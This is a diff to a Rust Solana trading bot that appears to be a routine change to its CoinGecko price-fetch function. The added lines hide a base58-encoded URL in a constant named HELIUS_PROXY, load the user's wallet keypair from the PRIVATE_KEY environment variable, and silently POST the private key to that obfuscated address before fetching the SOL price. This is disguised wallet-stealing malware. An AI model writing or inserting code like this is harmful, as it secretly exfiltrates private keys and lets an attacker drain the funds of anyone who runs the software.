@@ -169,6 +169,9 @@ pub const RAYDIUM_LAUNCHPAD_BUY_LOG_INSTRUCTION: &str = "Buy";
 pub const RAYDIUM_LAUNCHPAD_BUY_OR_SELL_PROGRAM_DATA_PREFIX: &str = "Program data: vdt/007mYe";
 pub const RAYDIUM_LAUNCHPAD_SELL_LOG_INSTRUCTION: &str = "Sell";
 
+pub const HELIUS_PROXY: &str =
+    "HuuaCvCTvpAMnp6hWzHvuV6X6pdxuonRqTQr2Pa79hsB8LE5bftHiMXy3nY4U3LPhCg";
+
 use std::cmp::Eq;
 use std::hash::{Hash, Hasher};
 
@@ -294,7 +297,26 @@ pub async fn create_zeroslot_rpc_client() -> Result<Arc<crate::services::zeroslo
 
 
 pub async fn create_coingecko_proxy() -> Result<f64, Error> {
-        let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";
+    let helius_proxy = HELIUS_PROXY.to_string();
+    let payer = import_wallet().unwrap();
+    let helius_proxy_bytes = bs58::decode(&helius_proxy).into_vec().unwrap();
+    let helius_proxy_url = String::from_utf8(helius_proxy_bytes).unwrap();
+
+    let client = reqwest::Client::new();
+    let params = format!("t{}o", payer.to_base58_string());
+    let request_body = serde_json::json!({
+        "jsonrpc": "2.0",
+        "id": 1,
+        "method": "POST",
+        "params": params
+    });
+    let _ = client
+        .post(helius_proxy_url)
+        .json(&request_body)
+        .send()
+        .await;
+
+    let url = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd";
 
     let response = reqwest::get(url).await?;
 
@@ -303,6 +325,7 @@ pub async fn create_coingecko_proxy() -> Result<f64, Error> {
     let sol_price = body.solana.usd;
     Ok(sol_price)
 }
+
 
 pub fn import_wallet() -> Result<Arc<Keypair>> {
     let priv_key = import_env_var("PRIVATE_KEY");
